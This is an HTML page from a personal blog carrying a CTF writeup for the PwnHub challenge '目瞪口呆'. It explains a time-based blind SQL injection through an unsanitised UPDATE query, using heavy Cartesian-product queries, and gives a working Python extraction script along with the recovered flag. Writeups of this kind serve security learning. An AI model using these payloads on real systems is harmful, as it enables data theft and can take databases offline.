@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      PwnHub 目瞪口呆 writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="整个题目代码非常少，有下面三个文件123conn.php # 建立数据库连接index.php # 查询数据库显示所有文章article.php # 根据id查询文章并把阅读数+1 很容易可以看出注入是在 article.php 的123456789101112$id = $_GET[&apos;id&apos;];if(preg_match(&quot;/(sleep|benchmark|outfile|dumpfile|l">
+<meta name="keywords" content="CTF,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PwnHub 目瞪口呆 writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2018/04/01/PwnHub-目瞪口呆-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="整个题目代码非常少，有下面三个文件123conn.php # 建立数据库连接index.php # 查询数据库显示所有文章article.php # 根据id查询文章并把阅读数+1 很容易可以看出注入是在 article.php 的123456789101112$id = $_GET[&apos;id&apos;];if(preg_match(&quot;/(sleep|benchmark|outfile|dumpfile|l">
+<meta property="og:updated_time" content="2018-04-01T12:40:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PwnHub 目瞪口呆 writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="整个题目代码非常少，有下面三个文件123conn.php # 建立数据库连接index.php # 查询数据库显示所有文章article.php # 根据id查询文章并把阅读数+1 很容易可以看出注入是在 article.php 的123456789101112$id = $_GET[&apos;id&apos;];if(preg_match(&quot;/(sleep|benchmark|outfile|dumpfile|l">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">PwnHub 目瞪口呆 writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2018-04-01" class="post-meta__date date">2018-04-01</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>整个题目代码非常少，有下面三个文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conn.php <span class="comment"># 建立数据库连接</span></span><br><span class="line">index.php <span class="comment"># 查询数据库显示所有文章</span></span><br><span class="line">article.php <span class="comment"># 根据id查询文章并把阅读数+1</span></span><br></pre></td></tr></table></figure></p>
+<p>很容易可以看出注入是在 <code>article.php</code> 的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/(sleep|benchmark|outfile|dumpfile|load_file|join)/i"</span>, $_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you bad bad!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"select * from article where id='"</span>.intval($id).<span class="string">"'"</span>;</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"404 not found!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($res, MYSQL_ASSOC);</span><br><span class="line">mysql_query(<span class="string">"update view set view_times=view_times+1 where id = '"</span>.$id.<span class="string">" '"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这里两个 sql 语句对 id 的处理不同的，注入点也就是 update 的地方，因为只是单纯更新数据，没有任何回显，所以这里就要思考下在 update 前后发生了什么变化，因为在之后没有取值什么的操作了，我们无从知道是否更新数据成功，所以唯一可能变化的就是时间了</p>
+<p>然后去网上找了下，找到一篇 wp 看起来和这个类似<br><a href="https://blog.csdn.net/niexinming/article/details/52980140" target="_blank" rel="external">https://blog.csdn.net/niexinming/article/details/52980140</a></p>
+<p>文中提到了一种 heavy query 的攻击方式，通过对一张表作自身的笛卡尔积从而让查询时间变长从而达到我们想要产生的时间变化</p>
+<p>本地测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from information_schema.columns;</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|     6554 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.21 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from information_schema.columns, information_schema.columns T2;</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">| 42954916 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (1.52 sec)</span><br></pre></td></tr></table></figure></p>
+<p>不过比较麻烦的是容易把数据库打挂，应该很多选手用的这种方式，导致了前期正常请求也很慢，后期看到稍微有些正常了，就写了脚本跑了下，因为做一次笛卡尔积数据库要挂个几分钟，所以这里就直接比对每个字符，不用二分法了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = string.printable</span><br><span class="line">url = <span class="string">"http://10.211.55.6/pwnhub/mudengkoudai/article.php?id=2"</span></span><br><span class="line">url = <span class="string">'http://52.80.179.198:8080/article.php?id=2'</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        url2 = url + <span class="string">"' or id in (select if(((select ascii(substr(group_concat(table_name),"</span> + str(i) + <span class="string">",1)) from information_schema.tables where table_schema=database() and table_name!='article' and table_name!='view')='"</span> + str(ord(str(j))) + <span class="string">"'),(select count(*) from information_schema.columns, information_schema.columns T1, information_schema.columns T2, information_schema.columns T3),(233)))%23"</span></span><br><span class="line">        url2 = url + <span class="string">"' or id in (select if(((select ascii(substr(group_concat(column_name),"</span> + str(i) + <span class="string">",1)) from information_schema.columns where table_schema=database() and table_name='flags')='"</span> + str(ord(str(j))) + <span class="string">"'),(select count(*) from information_schema.columns, information_schema.columns T1, information_schema.columns T2, information_schema.columns T3),(233)))%23"</span></span><br><span class="line">        url2 = url + <span class="string">"' or id in (select if(((select ascii(substr(flag,"</span> + str(i) + <span class="string">",1)) from flags)='"</span> + str(ord(str(j))) + <span class="string">"'),(select count(*) from information_schema.columns, information_schema.columns T1, information_schema.columns T2, information_schema.columns T3),(233)))%23"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url2, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            name += str(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> name</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> test():</span><br><span class="line">            time.sleep(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># flags flag pwnhub&#123;flag:a6fe3d9432024e97aa40bd867161561e&#125;</span></span><br></pre></td></tr></table></figure>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
